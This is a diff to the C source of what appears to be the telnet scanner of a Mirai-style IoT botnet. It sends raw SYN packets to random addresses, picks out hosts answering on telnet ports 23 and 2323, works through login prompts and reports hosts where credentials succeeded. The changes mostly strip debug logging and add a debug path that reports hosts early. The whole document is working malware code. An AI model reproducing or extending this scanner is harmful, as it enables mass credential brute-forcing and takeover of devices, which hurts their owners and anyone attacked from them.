@@ -18,7 +18,7 @@
 #include <string.h>
 #include <linux/ip.h>
 #include <linux/tcp.h>
-
+ 
 #include <sys/ioctl.h>
 #include <netinet/in.h>
 #include <net/if.h>
@@ -82,15 +82,9 @@ void scanner_init(void)
         return;
 
     LOCAL_ADDR = util_local_addr();
-#ifdef DEBUG
-    // printf("[scanner] LOCAL_ADDR %d.%d.%d.%d\n", LOCAL_ADDR & 0xff, (LOCAL_ADDR >> 8) & 0xff, (LOCAL_ADDR >> 16) & 0xff, (LOCAL_ADDR >> 24) & 0xff);
-#endif
 
     rand_init();
     fake_time = time(NULL);
-#ifdef DEBUG
-    // printf("[scanner] fake_time %d\n", fake_time);
-#endif
     conn_table = calloc(SCANNER_MAX_CONNS, sizeof (struct scanner_connection));
     for (i = 0; i < SCANNER_MAX_CONNS; i++)
     {
@@ -220,8 +214,7 @@ void scanner_init(void)
         fd_set fdset_rd, fdset_wr;
         struct scanner_connection *conn;
         struct timeval tim;
-        int last_avail_conn, last_spew = 0, mfd_rd = 0, mfd_wr = 0, nfds;
-        ipv4_t next_addr;
+        int last_avail_conn, last_spew, mfd_rd = 0, mfd_wr = 0, nfds;
 
         // Spew out SYN to try and get a response
         if (fake_time != last_spew)
@@ -233,6 +226,7 @@ void scanner_init(void)
                 struct sockaddr_in paddr = {0};
                 struct iphdr *iph = (struct iphdr *)scanner_rawpkt;
                 struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
+                ipv4_t next_addr;
 
                 iph->id = rand_next();
                 iph->saddr = LOCAL_ADDR;
@@ -285,84 +279,28 @@ void scanner_init(void)
             errno = 0;
             n = recvfrom(rsck, dgram, sizeof (dgram), MSG_NOSIGNAL, NULL, NULL);
             if (n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
-            {
-#ifdef DEBUG
-                // printf("[scanner] 111 n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK\n");
-#endif
                 break;
-            }
 
             if (n < sizeof(struct iphdr) + sizeof(struct tcphdr))
-            {
-#ifdef DEBUG
-                // printf("[scanner] 222 n %d < %d, \n", n, sizeof(struct iphdr) + sizeof(struct tcphdr));
-#endif
                 continue;
-            }
             if (iph->daddr != LOCAL_ADDR)
-            {
-#ifdef DEBUG
-                // printf("[scanner] 333 iph->daddr %d.%d.%d.%d\n", iph->daddr & 0xff, (iph->daddr >> 8) & 0xff, (iph->daddr >> 16) & 0xff, (iph->daddr >> 24) & 0xff);
-#endif
                 continue;
-            }
             if (iph->protocol != IPPROTO_TCP)
-            {
-#ifdef DEBUG
-                // printf("[scanner] 444 iph->protocol %d\n", iph->protocol);
-#endif
                 continue;
-            }
             if (tcph->source != htons(23) && tcph->source != htons(2323))
-            {
-#ifdef DEBUG
-                // printf("[scanner] 555 tcph->source %d\n", tcph->source);
-#endif
                 continue;
-            }
             if (tcph->dest != source_port)
-            {
-#ifdef DEBUG
-                // printf("[scanner] 666 tcph->dest %d, source_port %d\n", tcph->dest, source_port);
-#endif
                 continue;
-            }
             if (!tcph->syn)
-            {
-#ifdef DEBUG
-                // printf("[scanner] 777 tcph->syn %d\n", tcph->syn);
-#endif
                 continue;
-            }
             if (!tcph->ack)
-            {
-
-#ifdef DEBUG
-                // printf("[scanner] 888 tcph->ack %d\n", tcph->ack);
-#endif
                 continue;
-            }
             if (tcph->rst)
-            {
-#ifdef DEBUG
-                // printf("[scanner] 999 tcph->rst %d\n", tcph->rst);
-#endif
                 continue;
-            }
             if (tcph->fin)
-            {
-#ifdef DEBUG
-                // printf("[scanner] 000 tcph->fin %d\n", tcph->fin);
-#endif
                 continue;
-            }
             if (htonl(ntohl(tcph->ack_seq) - 1) != iph->saddr)
-            {
-#ifdef DEBUG
-                // printf("[scanner] aaa tcph->ack_seq %d, iph->saddr %d\n", tcph->ack_seq, iph->saddr);
-#endif
                 continue;
-            }
 
             conn = NULL;
             for (n = last_avail_conn; n < SCANNER_MAX_CONNS; n++)
@@ -371,21 +309,13 @@ void scanner_init(void)
                 {
                     conn = &conn_table[n];
                     last_avail_conn = n;
-#ifdef DEBUG
-                    // printf("[scanner] bbb conn_table[%d].state == SC_CLOSED\n", n);
-#endif
                     break;
                 }
             }
 
             // If there were no slots, then no point reading any more
             if (conn == NULL)
-            {
-#ifdef DEBUG
-                // printf("[scanner] ccc conn is NULL\n");
-#endif
                 break;
-            }
 
             conn->dst_addr = iph->saddr;
             conn->dst_port = tcph->source;
@@ -557,6 +487,15 @@ void scanner_init(void)
 #ifdef DEBUG
                                 printf("[scanner] FD%d finished telnet negotiation\n", conn->fd);
 #endif
+#ifdef DEBUG
+                                if (1==1)
+                                {
+                                    report_working(conn->dst_addr, conn->dst_port, conn->auth);
+                                    close(conn->fd);
+                                    conn->fd = -1;
+                                    conn->state = SC_CLOSED;
+                                }
+#endif
                             }
                             break;
                         case SC_WAITING_USERNAME:
@@ -568,19 +507,6 @@ void scanner_init(void)
 #ifdef DEBUG
                                 printf("[scanner] FD%d received username prompt\n", conn->fd);
 #endif
-                                if(consumed == 14)
-                                {
-                                    report_working(conn->dst_addr, conn->dst_port, conn->auth);
-                                    close(conn->fd);
-                                    conn->fd = -1;
-                                    conn->state = SC_CLOSED;
-                                }
-                            }
-                            else
-                            {
-#ifdef DEBUG
-                                printf("[scanner] FD%d receiving username prompt %d\n", conn->fd, consumed);
-#endif                          
                             }
                             break;
                         case SC_WAITING_PASSWORD:
@@ -595,12 +521,6 @@ void scanner_init(void)
                                 send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
 
                                 conn->state = SC_WAITING_PASSWD_RESP;
-                            }
-                            else
-                            {
-#ifdef DEBUG
-                                printf("[scanner] FD%d receiving password prompt %d\n", conn->fd, consumed);
-#endif                          
                             }
                             break;
                         case SC_WAITING_PASSWD_RESP:
@@ -641,7 +561,7 @@ void scanner_init(void)
                                 conn->state = SC_WAITING_SYSTEM_RESP;
                             }
                             break;
-                        case SC_WAITING_SYSTEM_RESP:
+			case SC_WAITING_SYSTEM_RESP:
                             if ((consumed = consume_any_prompt(conn)) > 0)
                             {
                                 char *tmp_str;
@@ -701,10 +621,6 @@ void scanner_init(void)
                             break;
                         case SC_WAITING_TOKEN_RESP:
                             consumed = consume_resp_prompt(conn);
-#ifdef DEBUG
-                            printf("[scanner] FD%d consumed return %d\n", consumed);
-                            consumed = 1;
-#endif
                             if (consumed == -1)
                             {
 #ifdef DEBUG
@@ -832,11 +748,6 @@ static int consume_iacs(struct scanner_connection *conn)
 {
     int consumed = 0;
     uint8_t *ptr = conn->rdbuf;
-    int ci;
-
-#ifdef DEBUG
-    printf("[scanner] consume_iacs ");
-#endif
 
     while (consumed < conn->rdbuf_pos)
     {
@@ -891,14 +802,6 @@ static int consume_iacs(struct scanner_connection *conn)
             }
         }
     }
-#ifdef DEBUG
-    for (ci = 0; ci < consumed; ci++)
-    {
-        uint8_t *p = conn->rdbuf;
-        printf("0x%x ", p[ci]);
-    }
-    printf(", consumed=%d\n", consumed);
-#endif
 
     return consumed;
 }
@@ -927,17 +830,6 @@ static int consume_user_prompt(struct scanner_connection *conn)
 {
     char *pch;
     int i, prompt_ending = -1;
-    char *p;
-
-#ifdef DEBUG
-    printf("[scanner] consume_user_prompt ");
-    p = conn->rdbuf;
-    for(i = 0; i < conn->rdbuf_pos - 1; i++)
-    {
-        printf("0x%x ", p[i]);
-    }
-    printf(", length=%d, ", conn->rdbuf_pos - 1);
-#endif
 
     for (i = conn->rdbuf_pos - 1; i > 0; i--)
     {
@@ -958,15 +850,6 @@ static int consume_user_prompt(struct scanner_connection *conn)
             prompt_ending = tmp;
     }
 
-    if (conn->rdbuf_pos == 15)
-    {
-        prompt_ending = conn->rdbuf_pos-1;
-    }
-
-#ifdef DEBUG
-    printf(", prompt_ending=%d\n", prompt_ending);
-#endif
-
     if (prompt_ending == -1)
         return 0;
     else
@@ -977,17 +860,6 @@ static int consume_pass_prompt(struct scanner_connection *conn)
 {
     char *pch;
     int i, prompt_ending = -1;
-    char *p;
-
-#ifdef DEBUG
-    printf("[scanner] consume_pass_prompt ");
-    p = conn->rdbuf;
-    for(i = 0; i < conn->rdbuf_pos - 1; i++)
-    {
-        printf("0x%x ", p[i]);
-    }
-    printf(", length=%d, ", conn->rdbuf_pos - 1);
-#endif
 
     for (i = conn->rdbuf_pos - 1; i > 0; i--)
     {
@@ -1005,10 +877,6 @@ static int consume_pass_prompt(struct scanner_connection *conn)
         if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "assword", 7)) != -1)
             prompt_ending = tmp;
     }
-
-#ifdef DEBUG
-    printf(", prompt_ending=%d\n", prompt_ending);
-#endif
 
     if (prompt_ending == -1)
         return 0;
